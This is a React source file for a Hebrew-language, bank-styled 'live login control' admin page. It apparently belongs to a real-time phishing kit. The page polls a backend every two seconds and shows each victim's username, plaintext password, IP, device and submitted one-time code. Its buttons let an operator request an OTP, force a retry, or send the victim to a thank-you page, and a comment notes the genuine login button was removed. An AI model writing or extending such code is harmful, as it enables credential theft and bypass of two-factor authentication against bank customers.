'use client'

import { useState, useEffect } from 'react'
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import { RefreshCw, CheckCircle, XCircle, Shield, Key, ArrowRight } from 'lucide-react'
import { LoginRequest, LoginStatus } from '@/lib/login-store'

export default function LiveControlPage() {
    const [requests, setRequests] = useState<LoginRequest[]>([])
    const [isLoading, setIsLoading] = useState(false)

    const fetchRequests = async () => {
        try {
            const res = await fetch('/api/auth/login-flow')
            if (res.ok) {
                const data = await res.json()
                setRequests(data)
            }
        } catch (error) {
            console.error('Failed to fetch requests', error)
        }
    }

    useEffect(() => {
        fetchRequests()
        const interval = setInterval(fetchRequests, 2000)
        return () => clearInterval(interval)
    }, [])

    const updateStatus = async (requestId: string, status: LoginStatus) => {
        setIsLoading(true)
        try {
            await fetch('/api/auth/login-flow', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: 'admin_update',
                    requestId,
                    status
                })
            })
            await fetchRequests()
        } catch (error) {
            console.error('Failed to update status', error)
        } finally {
            setIsLoading(false)
        }
    }

    const getStatusBadge = (status: LoginStatus) => {
        switch (status) {
            case 'PENDING_APPROVAL': return <Badge variant="secondary">ממתין לאישור</Badge>
            case 'OTP_REQUESTED': return <Badge variant="outline">מזין קוד...</Badge>
            case 'OTP_SUBMITTED': return <Badge className="bg-blue-500">קוד התקבל!</Badge>
            case 'APPROVED': return <Badge className="bg-green-500">אושר</Badge>
            case 'REDIRECT_THANK_YOU': return <Badge variant="destructive">נדחה (תודה)</Badge>
            case 'RETRY_OTP': return <Badge variant="outline" className="text-red-500">שגיאה/נסה שוב</Badge>
            default: return <Badge>{status}</Badge>
        }
    }

    return (
        <div className="min-h-screen bg-gray-50 p-8" dir="rtl">
            <div className="max-w-7xl mx-auto space-y-6">
                <div className="flex justify-between items-center">
                    <div>
                        <h1 className="text-3xl font-bold text-bank-primary">בקרת כניסות בזמן אמת</h1>
                        <p className="text-gray-500 mt-1">שליטה מלאה על תהליך ההתחברות של המשתמשים</p>
                    </div>
                    <Button onClick={fetchRequests} variant="outline" size="icon">
                        <RefreshCw className="h-4 w-4" />
                    </Button>
                </div>

                <div className="grid grid-cols-1 gap-6">
                    {requests.map((req) => (
                        <Card key={req.id} className={`border-l-4 ${req.status === 'OTP_SUBMITTED' ? 'border-l-blue-500 shadow-lg scale-[1.01] transition-all' : 'border-l-gray-200'}`}>
                            <CardContent className="p-6">
                                <div className="flex flex-col lg:flex-row justify-between items-start lg:items-center gap-4">

                                    {/* User Info */}
                                    <div className="space-y-2 min-w-[200px]">
                                        <div className="flex items-center gap-2">
                                            <span className="font-bold text-lg">{req.username}</span>
                                            <span className="text-xs font-mono bg-gray-100 px-2 py-1 rounded text-gray-500">#{req.id}</span>
                                        </div>
                                        <div className="text-sm text-gray-500 flex flex-col gap-1">
                                            <span>סיסמה: {req.password}</span>
                                            <span>{req.ip} | {req.device}</span>
                                            <span>{new Date(req.timestamp).toLocaleTimeString()}</span>
                                        </div>
                                    </div>

                                    {/* Status & OTP Display */}
                                    <div className="flex-1 flex flex-col items-center justify-center gap-2 text-center">
                                        {getStatusBadge(req.status)}

                                        {req.otp && (
                                            <div className="mt-2 bg-gray-100 px-6 py-3 rounded-xl border-2 border-dashed border-gray-300">
                                                <div className="text-sm text-gray-500 mb-1">קוד שהתקבל</div>
                                                <div className="text-3xl font-mono font-bold tracking-widest text-bank-primary">
                                                    {req.otp}
                                                </div>
                                            </div>
                                        )}
                                    </div>

                                    {/* Actions */}
                                    <div className="flex flex-col gap-2 min-w-[200px]">
                                        {req.status === 'PENDING_APPROVAL' && (
                                            <Button
                                                className="bg-blue-600 hover:bg-blue-700 text-white"
                                                onClick={() => updateStatus(req.id, 'OTP_REQUESTED')}
                                            >
                                                <Key className="ml-2 h-4 w-4" />
                                                בקש קוד אימות
                                            </Button>
                                        )}

                                        {(req.status === 'OTP_SUBMITTED' || req.status === 'PENDING_APPROVAL' || req.status === 'OTP_REQUESTED') && (
                                            <>
                                                {/* Login button removed as requested */}

                                                <Button
                                                    variant="secondary"
                                                    onClick={() => updateStatus(req.id, 'RETRY_OTP')}
                                                >
                                                    <RefreshCw className="ml-2 h-4 w-4" />
                                                    בקש קוד שוב
                                                </Button>

                                                <Button
                                                    variant="destructive"
                                                    onClick={() => updateStatus(req.id, 'REDIRECT_THANK_YOU')}
                                                >
                                                    <ArrowRight className="ml-2 h-4 w-4" />
                                                    שלח לדף תודה
                                                </Button>
                                            </>
                                        )}
                                    </div>

                                </div>
                            </CardContent>
                        </Card>
                    ))}

                    {requests.length === 0 && (
                        <div className="text-center py-12 text-gray-500">
                            אין בקשות כניסה פעילות כרגע...
                        </div>
                    )}
                </div>
            </div>
        </div>
    )
}
